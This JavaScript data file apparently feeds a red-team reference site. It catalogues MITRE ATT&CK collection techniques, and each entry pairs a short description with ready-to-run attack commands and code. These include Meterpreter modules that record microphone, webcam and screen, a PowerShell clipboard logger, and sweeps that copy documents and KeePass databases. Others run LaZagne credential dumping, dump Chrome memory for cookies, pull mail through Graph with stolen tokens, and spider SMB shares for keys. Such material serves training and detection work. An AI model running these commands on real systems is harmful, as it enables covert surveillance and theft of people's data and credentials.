export const collectionTechniques = [
  {
    id: "T1560",
    name: "Archive Collected Data",
    summary: "7zip • tar • rar • encrypted archives",
    description: "Archiving and compressing collected data prior to exfiltration to reduce size and obscure contents.",
    tags: ["T1560", "7zip", "tar", "rar", "archive", "compression"],
    steps: [
      { type: "comment", content: "# T1560.001 - Archive and encrypt data for exfil" },
      { type: "cmd", content: "7z a -tzip -p'SecretPass123' -r collected_data.zip target_folder/\ntar czf data.tar.gz --exclude='*.exe' /home/user/documents/" },
      { type: "comment", content: "# Split large archives to avoid size-based detection" },
      { type: "cmd", content: "7z a -v50m collected_data.7z target_folder/  # Split into 50MB parts\ntar czf - /data | split -b 50M - data_split_" },
    ]
  },
  {
    id: "T1123",
    name: "Audio Capture",
    summary: "microphone • VOIP capture • recorder",
    description: "Recording audio from system microphones to capture conversations and sensitive verbal communications.",
    tags: ["T1123", "microphone", "audio capture", "recording"],
    steps: [
      { type: "comment", content: "# PowerShell audio capture via Meterpreter" },
      { type: "cmd", content: "meterpreter > run post/multi/manage/record_mic -d 30  # Record for 30 seconds" },
      { type: "comment", content: "# Python audio capture using pyaudio" },
      { type: "code", content: "import pyaudio, wave\naudio = pyaudio.PyAudio()\nstream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)\nframes = [stream.read(1024) for _ in range(int(44100 / 1024 * 30))]  # 30 sec\nwf = wave.open('recording.wav', 'wb'); wf.setnchannels(1); wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16)); wf.setframerate(44100); wf.writeframes(b''.join(frames))" },
    ]
  },
  {
    id: "T1185",
    name: "Browser Session Hijacking",
    summary: "browser injection • cookie theft • MitB",
    description: "Injecting into browser processes to collect information from active browsing sessions including credentials and session data.",
    tags: ["T1185", "browser hijack", "MitB", "session data"],
    steps: [
      { type: "comment", content: "# Man-in-the-Browser via BeEF XSS framework" },
      { type: "cmd", content: "beef-xss  # Hook victim browsers\n# Once hooked, use browser commands: get cookies, history, keylogger" },
      { type: "comment", content: "# Extract data from running browser process memory" },
      { type: "cmd", content: "# Dump Chrome process memory and search for credentials\nprocdump64.exe -ma chrome.exe chrome.dmp\nstrings chrome.dmp | grep -i 'session\\|cookie\\|auth'" },
    ]
  },
  {
    id: "T1119",
    name: "Automated Collection",
    summary: "scripts • PowerShell • automated harvesting",
    description: "Using scripts and automated tools to systematically collect data from compromised systems.",
    tags: ["T1119", "automated collection", "scripts", "harvesting"],
    steps: [
      { type: "comment", content: "# Automated collection script targeting common sensitive locations" },
      { type: "code", content: "# PowerShell automated data collection\n$targets = @(\n    \"$env:USERPROFILE\\Desktop\",\n    \"$env:USERPROFILE\\Documents\",\n    \"$env:USERPROFILE\\Downloads\"\n)\n$patterns = @('*.docx','*.xlsx','*.pdf','*.pptx','*.txt','*.kdbx','*.key')\nforeach ($target in $targets) {\n    Get-ChildItem -Path $target -Include $patterns -Recurse -ErrorAction SilentlyContinue |\n        Where-Object {$_.Length -lt 50MB} |\n        Copy-Item -Destination 'C:\\Windows\\Temp\\collected\\' -Force\n}" },
      { type: "comment", content: "# Run LaZagne for automated credential collection" },
      { type: "cmd", content: "laZagne.exe all -oN -output C:\\Windows\\Temp\\creds" },
    ]
  },
  {
    id: "T1115",
    name: "Clipboard Data",
    summary: "clipboard monitor • Get-Clipboard • xclip",
    description: "Collecting data copied to the clipboard which may include passwords, credentials, and sensitive information.",
    tags: ["T1115", "clipboard", "Get-Clipboard", "xclip"],
    steps: [
      { type: "comment", content: "# Windows clipboard monitoring" },
      { type: "code", content: "# Continuous clipboard monitoring in PowerShell\n$prev = ''\nwhile($true) {\n    $clip = Get-Clipboard -Raw\n    if ($clip -and $clip -ne $prev) {\n        $prev = $clip\n        Add-Content 'C:\\Windows\\Temp\\clip.txt' \"[$(Get-Date)] $clip\"\n    }\n    Start-Sleep -Seconds 2\n}" },
      { type: "comment", content: "# Meterpreter clipboard capture" },
      { type: "cmd", content: "meterpreter > run post/multi/manage/clipboard_monitor\nmeterpreter > getclipboard" },
    ]
  },
  {
    id: "T1213",
    name: "Data from Information Repositories",
    summary: "SharePoint • Confluence • Slack • OneDrive",
    description: "Collecting data from information repositories such as SharePoint, Confluence, code repositories, and cloud storage.",
    tags: ["T1213", "SharePoint", "Confluence", "OneDrive", "repositories"],
    steps: [
      { type: "comment", content: "# T1213.002 - Enumerate and download SharePoint content" },
      { type: "cmd", content: "# Use PnP PowerShell with stolen credentials:\nConnect-PnPOnline -Url https://corp.sharepoint.com/sites/IT -Credentials $cred\nGet-PnPListItem -List 'Shared Documents' | ForEach-Object {$_.FieldValues.FileLeafRef}" },
      { type: "comment", content: "# Download from SharePoint via Microsoft Graph API" },
      { type: "cmd", content: "# With stolen OAuth token:\ncurl -H 'Authorization: Bearer TOKEN' 'https://graph.microsoft.com/v1.0/sites/root/drives' | python3 -m json.tool" },
      { type: "comment", content: "# T1213.003 - Collect from code repositories" },
      { type: "cmd", content: "trufflehog git https://github.com/corp/private-repo.git  # Scan for secrets in git history" },
    ]
  },
  {
    id: "T1005",
    name: "Data from Local System",
    summary: "file search • Meterpreter download • powershell",
    description: "Collecting data from local file systems on compromised endpoints.",
    tags: ["T1005", "local collection", "file search", "download"],
    steps: [
      { type: "comment", content: "# Collect all Office documents < 10MB" },
      { type: "cmd", content: "Get-ChildItem -Path C:\\ -Recurse -Include *.docx,*.xlsx,*.pdf,*.pptx -ErrorAction SilentlyContinue | Where-Object {$_.Length -lt 10MB} | Copy-Item -Destination C:\\Windows\\Temp\\docs\\" },
      { type: "comment", content: "# Meterpreter file download" },
      { type: "cmd", content: "meterpreter > search -f *.kdbx  # Find KeePass databases\nmeterpreter > download 'C:\\Users\\user\\Documents\\passwords.kdbx' /tmp/" },
      { type: "comment", content: "# Find recently modified files (active work)" },
      { type: "cmd", content: "Get-ChildItem -Recurse C:\\Users\\ -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)} | Sort LastWriteTime -Descending | Select FullName,Length,LastWriteTime | Select-Object -First 50" },
    ]
  },
  {
    id: "T1039",
    name: "Data from Network Shared Drive",
    summary: "network share collection • SMB • NFS",
    description: "Collecting data from accessible network shares including file servers, NAS devices, and departmental shares.",
    tags: ["T1039", "network shares", "SMB collection", "NAS"],
    steps: [
      { type: "comment", content: "# Map network shares and collect from accessible ones" },
      { type: "cmd", content: "net use Z: \\\\fileserver\\share /user:DOMAIN\\user password\nrobocopy Z:\\ C:\\Windows\\Temp\\collected\\ /E /NFL /NDL /NJH /NJS /NP" },
      { type: "comment", content: "# Recursive collection from SMB with CrackMapExec" },
      { type: "cmd", content: "nxc smb fileserver -u user -p pass --spider-folder '' --depth 5 --pattern kdbx,pfx,key,pem --download" },
    ]
  },
  {
    id: "T1114",
    name: "Email Collection",
    summary: "Exchange • Office 365 • MAPI • MailSniper",
    description: "Collecting email data from compromised mail servers, clients, or cloud email services.",
    tags: ["T1114", "Exchange", "Office 365", "MailSniper", "email"],
    steps: [
      { type: "comment", content: "# T1114.001 - Collect local Outlook PST files" },
      { type: "cmd", content: "Get-ChildItem -Recurse -Filter '*.pst' -ErrorAction SilentlyContinue C:\\Users\\\nGet-ChildItem -Recurse -Filter '*.ost' -ErrorAction SilentlyContinue C:\\Users\\" },
      { type: "comment", content: "# T1114.002 - Remote email collection via Exchange Web Services" },
      { type: "cmd", content: "Invoke-SelfSearch -Mailbox user@corp.com -ExchHostname mail.corp.com -remote  # MailSniper" },
      { type: "comment", content: "# T1114.003 - Office 365 email collection with stolen token" },
      { type: "cmd", content: "# Microsoft Graph API with stolen token:\ncurl -H 'Authorization: Bearer TOKEN' 'https://graph.microsoft.com/v1.0/users/victim@corp.com/messages?$top=100&$orderby=receivedDateTime desc'" },
    ]
  },
  {
    id: "T1113",
    name: "Screen Capture",
    summary: "screenshot • Meterpreter • ESFScreenCapture",
    description: "Capturing screenshots of the desktop to collect information displayed on screen.",
    tags: ["T1113", "screenshot", "screen capture", "Meterpreter"],
    steps: [
      { type: "comment", content: "# Meterpreter screenshot" },
      { type: "cmd", content: "meterpreter > screenshot\nmeterpreter > run post/multi/manage/screenshot -i 30  # Every 30 seconds" },
      { type: "comment", content: "# PowerShell screenshot" },
      { type: "code", content: "Add-Type -AssemblyName System.Windows.Forms\n$bitmap = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,\n    [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)\n$graphics = [System.Drawing.Graphics]::FromImage($bitmap)\n$graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size)\n$bitmap.Save('C:\\Windows\\Temp\\screenshot.png')" },
    ]
  },
  {
    id: "T1125",
    name: "Video Capture",
    summary: "webcam capture • screen recording • ffmpeg",
    description: "Capturing video from victim webcams or recording the screen to collect intelligence.",
    tags: ["T1125", "webcam", "video capture", "screen recording"],
    steps: [
      { type: "comment", content: "# Meterpreter webcam capture" },
      { type: "cmd", content: "meterpreter > webcam_list\nmeterpreter > webcam_snap -i 1  # Capture still image\nmeterpreter > run post/multi/manage/record_video -t 30  # 30 second video" },
      { type: "comment", content: "# Screen recording via ffmpeg on compromised system" },
      { type: "cmd", content: "ffmpeg -video_size 1920x1080 -framerate 10 -f gdigrab -i desktop -t 60 screen_recording.mp4" },
    ]
  },
];